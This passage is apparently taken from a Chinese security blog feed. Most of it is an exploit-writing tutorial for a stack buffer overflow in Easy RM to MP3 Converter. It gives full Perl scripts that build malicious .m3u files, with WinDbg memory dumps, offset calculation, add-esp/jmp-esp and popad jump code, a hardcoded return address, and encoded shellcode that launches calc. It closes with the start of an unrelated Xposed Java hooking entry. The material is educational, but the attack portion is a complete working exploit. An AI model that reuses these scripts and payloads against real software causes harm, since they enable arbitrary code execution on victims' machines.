my $pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B";
my $junk= "A" x 25067;
my $eip = "BBBB";
my $preshellcode = "X" x 54; #let's pretend this is the only space we have available at ESP
my $nop = "\x90" x 230; #added some nops to visually separate our 54 X's from other data in the ESP dump
open($FILE,"&gt;$file");
print $FILE $pattern.$junk.$eip.$preshellcode.$nop;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>用Easy RM to MP3打开测试文件</p>
<pre><code>eax=00000001 ebx=00104a58 ecx=7c93003d edx=00000004 esi=77c2fce0 edi=000066f3
eip=42424242 esp=000ffd38 ebp=00104678 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
42424242 ??              ???
0:000&gt; d esp
000ffd38  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ffd48  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ffd58  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ffd68  58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90  XX..............
000ffd78  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffd88  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffd98  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffda8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:000&gt; d
000ffdb8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffdc8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffdd8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffde8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffdf8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe08  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe18  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe28  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:000&gt; d
000ffe38  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe48  90 90 90 90 90 90 90 90-00 35 41 69 36 41 69 37  .........5Ai6Ai7
000ffe58  41 69 38 41 69 39 41 6a-30 41 6a 31 41 6a 32 41  Ai8Ai9Aj0Aj1Aj2A
000ffe68  6a 33 41 6a 34 41 6a 35-41 6a 36 41 6a 37 41 6a  j3Aj4Aj5Aj6Aj7Aj
000ffe78  38 41 6a 39 41 6b 30 41-6b 31 41 6b 32 41 6b 33  8Aj9Ak0Ak1Ak2Ak3
000ffe88  41 6b 34 41 6b 35 41 6b-36 41 6b 37 41 6b 38 41  Ak4Ak5Ak6Ak7Ak8A
000ffe98  6b 39 41 6c 30 41 6c 31-41 6c 32 41 6c 33 41 6c  k9Al0Al1Al2Al3Al
000ffea8  34 41 6c 35 41 6c 36 41-6c 37 41 6c 38 41 6c 39  4Al5Al6Al7Al8Al9
0:000&gt; d
000ffeb8  41 6d 30 41 6d 31 41 6d-32 41 6d 33 41 6d 34 41  Am0Am1Am2Am3Am4A
000ffec8  6d 35 41 6d 36 41 6d 37-41 6d 38 41 6d 39 41 6e  m5Am6Am7Am8Am9An
000ffed8  30 41 6e 31 41 6e 32 41-6e 33 41 6e 34 41 6e 35  0An1An2An3An4An5
000ffee8  41 6e 36 41 6e 37 41 6e-38 41 6e 39 41 6f 30 41  An6An7An8An9Ao0A
000ffef8  6f 31 41 6f 32 41 6f 33-41 6f 34 41 6f 35 41 6f  o1Ao2Ao3Ao4Ao5Ao
000fff08  36 41 6f 37 41 6f 38 41-6f 39 41 70 30 41 70 31  6Ao7Ao8Ao9Ap0Ap1
000fff18  41 70 32 41 70 33 41 70-34 41 70 35 41 70 36 41  Ap2Ap3Ap4Ap5Ap6A
000fff28  70 37 41 70 38 41 70 39-41 71 30 41 71 31 41 71  p7Ap8Ap9Aq0Aq1Aq
</code></pre>
<p>可以看到模式字符串从5Ai6开始，借助pattern_offset.rb工具来定位一下5Ai6在模式字符串中的位置</p>
<pre><code>kali@kali:/usr/share/metasploit-framework/tools/exploit$ ./pattern_offset.rb -q 5Ai6[*] Exact match at offset 257kali@kali:/usr/share/metasploit-framework/tools/exploit$ 
</code></pre>
<p>可以看到这4个字符的偏移量为257，这下我们可以设计我们要放置shellcode的位置，将文件的前257个字节放置不影响shellcode执行的字符，之后加上我们的shellcode然后剩余的字节还是填充为A。</p>
<p>编写perl脚本查看一下内存是否如我们所想的一样</p>
<pre><code class="perl">my $file= "blind_return_3.m3u";my $buffersize = 26067;my $junk= "A" x 250;	my $nop = "\x90" x50;	#250个字节的A加上一些不影响执行的nop（在内存空间足够用的时候在计算的shellcode地址之前填充一些nop指令可以让我们的shellcode适应性更强一点）my $shellcode = "\xcc";my $restofbuffer = "A" x ($buffersize - (length($junk) + length($nop) + length($shellcode)));my $eip = "BBBB";my $preshellcode = "X" x 54; #let's pretend this is the only space we have available at ESPmy $nop2 = "\x90" x 230; #added some nops to visually separate our 54 X's from other data in the ESP dumpopen($FILE,"&gt;$file");print $FILE $junk.$nop.$shellcode.$restofbuffer.$eip.$preshellcode.$nop2;close($FILE);
</code></pre>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210113231801856-1621477705987.png" class="" title="image-20210113231801856">

<p>当程序中断后我们可以看到，NOP起始于0x000ffe51,后面是我们的shellcode（0xCC)，再之后是一串A字符。</p>
<p><em><strong>接下来我们需要在ESP（上图中X的地址）中放入jmpshellcode指令</strong></em>，来帮助我们跳转到ESP+281的位置。</p>
<p>所以我们需要在内存中寻找指令将ESP+281（或者可以稍大一点，因为我们在shellcode前放置了NOP串，这可以使shellcode的设计具有一定的灵活性）然后再使用jmp esp指令跳转到我们shellcode的位置。</p>
<p>这里我们可以寻找三个<code>add esp,0x50e</code>指令，0x5e * 3 = 11Ah &gt; 281(119h)，然后再寻找一个jmp esp指令就构成了我们的jmpshellcode了。</p>
<pre><code>0:010&gt; a
7c92120e add esp,0x5e
add esp,0x5e
7c921211 add esp,0x5e
add esp,0x5e
7c921214 add esp,0x5e
add esp,0x5e
7c921217 jmp esp
jmp esp
7c921219 

0:010&gt; u 7c92120e 
ntdll!DbgBreakPoint:
7c92120e 83c45e          add     esp,5Eh
7c921211 83c45e          add     esp,5Eh
7c921214 83c45e          add     esp,5Eh
7c921217 ffe4            jmp     esp
7c921219 04cc            add     al,0CCh
7c92121b c20400          ret     4
ntdll!NtCurrentTeb:
7c92121e 64a118000000    mov     eax,dword ptr fs:[00000018h]
7c921224 c3              ret
</code></pre>
<p>从上面我们可以知道jumpcode的机器码为：0x83,0xc4,0x5e,0x83,0xc4,0x5e,0x83,0xc4,0x5e,0xff,0xe4</p>
<p>然后我们可以根据前面测试得到的一些信息来修改一下我们的exp，然后运行测试一下jmpcode是否可以覆盖ESP的位置</p>
<pre><code class="perl">my $file= "blind_return_4.m3u";
my $buffersize = 26067;
my $junk= "A" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xcc"; #position 300
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));
my $eip = "BBBB";
my $preshellcode = "X" x 4;
my $jumpcode = "\x83\xc4\x5e" . #add esp,0x5e
"\x83\xc4\x5e" . #add esp,0x5e
"\x83\xc4\x5e" . #add esp,0x5e
"\xff\xe4"; #jmp esp
my $nop2 = "0x90" x 10; # only used to visually separate
my $buffer = $junk.$nop.$shellcode.$restofbuffer;
print "Size of buffer : ".length($buffer)."\n";
open($FILE,"&gt;$file");
print $FILE $buffer.$eip.$preshellcode.$jumpcode;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210129232150356-1621477705987.png" class="" title="image-20210129232150356">

<p>从图中我们可以看到，esp已经被我们的jmpcode覆盖，执行jmpcode后，ESP将会指向0xFFE50~0xFFE7B之间的地址</p>
<p>这样的话，最后我们就只需要将ESP修改为jmp esp指令的地址，来让EIP先指向我们的jmpcode处</p>
<p>在前面的调试中我们找到了一个符合我们要求jmp esp的地址（0x01b9f23a），直接拿来用就好。</p>
<p>调整shellcode布局在预定的shellcode处放置0xcc</p>
<pre><code class="perl">my $file= "blind_return_5.m3u";
my $buffersize = 26067;
my $junk= "A" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xcc"; #position 300
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));
my $eip = pack('V',0x01b9f23a);
my $preshellcode = "X" x 4;
my $jumpcode = "\x83\xc4\x5e" . #add esp,0x5e
"\x83\xc4\x5e" . #add esp,0x5e
"\x83\xc4\x5e" . #add esp,0x5e
"\xff\xe4"; #jmp esp
my $nop2 = "0x90" x 10; # only used to visually separate
my $buffer = $junk.$nop.$shellcode.$restofbuffer;
print "Size of buffer : ".length($buffer)."\n";
open($FILE,"&gt;$file");
print $FILE $buffer.$eip.$preshellcode.$jumpcode;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<pre><code>eax=00000001 ebx=00104a58 ecx=7c93003d edx=00aa0000 esi=77c2fce0 edi=000065e6
eip=000ffe7c esp=000ffe52 ebp=00104678 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
000ffe7c cc              int     3
0:000&gt; d esp
000ffe52  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe62  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe72  90 90 90 90 90 90 90 90-90 90 cc 41 41 41 41 41  ...........AAAAA
000ffe82  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffe92  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffea2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffeb2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffec2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
</code></pre>
<p>可以看到果然中断在了我们预定的地址，接下来我们就可以将0xcc替换为真正的shellcode，同时将字符’A’替换为’NOP’，之后就可以跳入更大的空间，所以只需要跳转188（2 * 5e）即可。</p>
<pre><code class="perl">my $file= "blind_return_6.m3u";
my $buffersize = 26067;
my $junk= "\x90" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" .
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" .
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" .
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" .
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" .
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" .
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" .
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" .
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" .
"\x7f\xe8\x7b\xca"; #position 300
my $restofbuffer = "\x90" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));
my $eip = pack('V',0x01b9f23a);
my $preshellcode = "X" x 4;
my $jumpcode = "\x83\xc4\x5e" . #add esp,0x5e
"\x83\xc4\x5e" . #add esp,0x5e
#"\x83\xc4\x5e" . #add esp,0x5e
"\xff\xe4"; #jmp esp
my $nop2 = "0x90" x 10; # only used to visually separate
my $buffer = $junk.$nop.$shellcode.$restofbuffer;
print "Size of buffer : ".length($buffer)."\n";
open($FILE,"&gt;$file");
print $FILE $buffer.$eip.$preshellcode.$jumpcode;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>成功弹出计算器</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210131221051399-1621477705987.png" class="" title="image-20210131221051399">



<h3 id="其它跳转方式"><a href="#其它跳转方式" class="headerlink" title="其它跳转方式"></a>其它跳转方式</h3><ul>
<li>popad</li>
<li>硬编码跳转地址</li>
</ul>
<p>“popad”指令也可以帮助我们跳转到shellcode，popad将从栈ESP中弹出DWORD数据，并赋予各通用寄存器，他按以下顺序加载各寄存器：EDI, ESI, EBP, EDX, ECX, EAX. 因此，每次加载寄存器（popad引起的）时ESP都会递增。一次popad将用掉ESP中的32字节，并以有序的方式将其pop到个寄存器中。</p>
<p>popad的机器码是0x61</p>
<p>假设你需要跳转40字节，而你只有两字节可以用于跳转，那么你可以使用两个popad指令来使ESP指向shellcode（以一串NOP指令开头以弥补我们两次跳过的32bytes - 40bytes大小的空间）。让我们再次以 Easy RM to MP3漏洞来演示这项技术：</p>
<p>我们还使用我们前面用的脚本来练习，伪造一个缓冲区，在ESP处填充13个“X”,然后再放置一些垃圾数据（“D”&amp;“A”）。后面接着放置我们的shellcode（NOPS  + A’s）</p>
<pre><code class="perl">my $file= "test1.m3u";
my $buffersize = 26067;
my $junk= "C" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xcc";
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));
my $eip = "BBBB";
my $preshellcode = "X" x 17; #let's pretend this is the only space we have available
my $garbage = "D" x 100; #let’s pretend this is the space we need to jump over
my $buffer = $junk.$nop.$shellcode.$restofbuffer;
print "Size of buffer : ".length($buffer)."\n";
open($FILE,"&gt;$file");
print $FILE $buffer.$eip.$preshellcode.$garbage;
close($FILE);
</code></pre>
<pre><code>eax=00000001 ebx=00104a58 ecx=7c93003d edx=00aa0000 esi=77c2fce0 edi=0000664c
eip=42424242 esp=000ffd38 ebp=00104678 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
42424242 ??              ???
0:000&gt; d esp
000ffd38  58 58 58 58 58 58 58 58-58 58 58 58 58 44 44 44  XXXXXXXXXXXXXDDD
000ffd48  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
000ffd58  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
000ffd68  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
000ffd78  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
000ffd88  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
000ffd98  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
000ffda8  44 00 43 43 43 43 43 43-43 43 43 43 43 43 43 43  D.CCCCCCCCCCCCCC
0:000&gt; d
000ffdb8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffdc8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffdd8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffde8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffdf8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffe08  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffe18  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffe28  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0:000&gt; d
000ffe38  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffe48  43 43 90 90 90 90 90 90-90 90 90 90 90 90 90 90  CC..............
000ffe58  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe68  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe78  90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA
000ffe88  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffe98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffea8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000&gt; d
000ffeb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffec8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffed8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
</code></pre>
<p>假设我们需要直接在ESP中的13字节“X”里面跳过100字节“D”和160字节“A”（共260字节），末尾再放置shellcode（以NOPs开头，接着放一个”0xcc”，然后A’s（shellcode）。一个popad指令相当于从栈中弹出32字节，因此260字节 = 9 * popad’s - 28 bytes。因此，我们需要在shellcode头部的位置放置一段NOPs，或者起始于shellcode入口地址 + 28字节。至此，我们已在shellcode之前放置NOPs，现在可以尝试使用”popad”指令进入NOPs，然后看程序是否能够中断在断点处。</p>
<p>调整一下脚本，还用我们之前找好的 jmp esp 地址覆盖 EIP 然后用9个 popad 指令替代之前的 X‘s，之后再接上0xff 0xE4(jmp esp)。</p>
<pre><code class="perl">my $file= "test2.m3u";
my $buffersize = 26067;
my $junk= "C" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xcc";
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));
my $eip = pack('V',0x01b9f23a);
my $preshellcode = "X" * 4;
$preshellcode = $preshellcode . "\x61" x 9;
$preshellcode = $preshellcode . "\xff\xe4";
$preshellcode = $preshellcode . "\x90" x 3;
 #let's pretend this is the only space we have available
my $garbage = "D" x 100; #let’s pretend this is the space we need to jump over
my $buffer = $junk.$nop.$shellcode.$restofbuffer;
print "Size of buffer : ".length($buffer)."\n";
open($FILE,"&gt;$file");
print $FILE $buffer.$eip.$preshellcode.$garbage;
close($FILE);
</code></pre>
<p>打开文件后断在了我们设置的int3断点处。查看一下当前EIP和ESP的情况：</p>
<pre><code>eax=43434343 ebx=43434395 ecx=43434343 edx=43434343 esi=43434343 edi=43434343
eip=000ffe7c esp=000ffdf8 ebp=43434343 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
000ffe7c cc              int     3
0:000&gt; d eip
000ffe7c  cc 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  .AAAAAAAAAAAAAAA
000ffe8c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffe9c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffeac  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffebc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffecc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffedc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffeec  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000&gt; d eip-32
000ffe4a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe5a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe6a  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe7a  90 90 cc 41 41 41 41 41-41 41 41 41 41 41 41 41  ...AAAAAAAAAAAAA
000ffe8a  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffe9a  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffeaa  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffeba  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000&gt; d esp
000ffdf8  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffe08  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffe18  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffe28  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffe38  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
000ffe48  43 43 90 90 90 90 90 90-90 90 90 90 90 90 90 90  CC..............
000ffe58  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe68  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:000&gt; d
000ffe78  90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA
000ffe88  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffe98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffea8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffeb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffec8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffed8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffee8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
</code></pre>
<p>接下来可以使用真正的shellcode来替换掉”0xcc”</p>
<pre><code>my $file= "test3.m3u";
my $buffersize = 26067;
my $junk= "C" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" .
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" .
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" .
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" .
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" .
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" .
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" .
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" .
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" .
"\x7f\xe8\x7b\xca"; 
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));
my $eip = pack('V',0x01b9f23a);
my $preshellcode = "X" * 4;
$preshellcode = $preshellcode . "\x61" x 9;
$preshellcode = $preshellcode . "\xff\xe4";
$preshellcode = $preshellcode . "\x90" x 3;
 #let's pretend this is the only space we have available
my $garbage = "D" x 100; #let’s pretend this is the space we need to jump over
my $buffer = $junk.$nop.$shellcode.$restofbuffer;
print "Size of buffer : ".length($buffer)."\n";
open($FILE,"&gt;$file");
print $FILE $buffer.$eip.$preshellcode.$garbage;
close($FILE);
</code></pre>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210206000619469-1621477705987.png" class="" title="image-20210206000619469">

<p>shellcode执行成功</p>
]]></content>
      <categories>
        <category>Win逆向</category>
      </categories>
      <tags>
        <tag>exploit编写</tag>
        <tag>溢出类型漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>hook一般函数</title>
    <url>/2023/12/13/hook%E4%B8%80%E8%88%AC%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>对一般函数的hook流程和对构造函数的hook流程大致一样，Xposed不仅能对java函数进行hook也能对JNI函数进行hook</p>
<p>本章主要是对java中以下这几类一般函数进行hook</p>
<blockquote>
<ol>
<li>一般java函数的hook</li>
<li>内部类中的函数hook</li>
<li>匿名内部类函数的hook</li>
<li>类中JNI函数的hook</li>
</ol>
</blockquote>
<span id="more"></span>

<h3 id="hook一般java函数"><a href="#hook一般java函数" class="headerlink" title="hook一般java函数"></a>hook一般java函数</h3><p>先创建一些一般函数等下用来测试hook</p>
<img src="/2023/12/13/hook%E4%B8%80%E8%88%AC%E5%87%BD%E6%95%B0/image-20231212222313726.png" class="" title="image-20231212222313726">

<ul>
<li><p>例如这些，我们在Student这个Class中添加一些普通函数：公有的、私有的、静态的、非静态的</p>
</li>
<li><p>然后再调用它们，打印显示一下</p>
<img src="/2023/12/13/hook%E4%B8%80%E8%88%AC%E5%87%BD%E6%95%B0/image-20231212222520403.png" class="" title="image-20231212222520403"></li>
</ul>
<h4 id="一般java函数的hook"><a href="#一般java函数的hook" class="headerlink" title="一般java函数的hook"></a>一般java函数的hook</h4><p>测试这几种类型的函数：</p>
<blockquote>
<p>publicStaticFunc</p>
<p>privateStaticFunc</p>
<p>publicFunc</p>
<p>privateFunc</p>
</blockquote>
<p>运行hook代码，将其安装在手机上，可能会提示需要重启框架。测试的时候发现不重启其实也能正常运行</p>
<img src="/2023/12/13/hook%E4%B8%80%E8%88%AC%E5%87%BD%E6%95%B0/image-20231212222949471.png" class="" title="image-20231212222949471">

<ul>
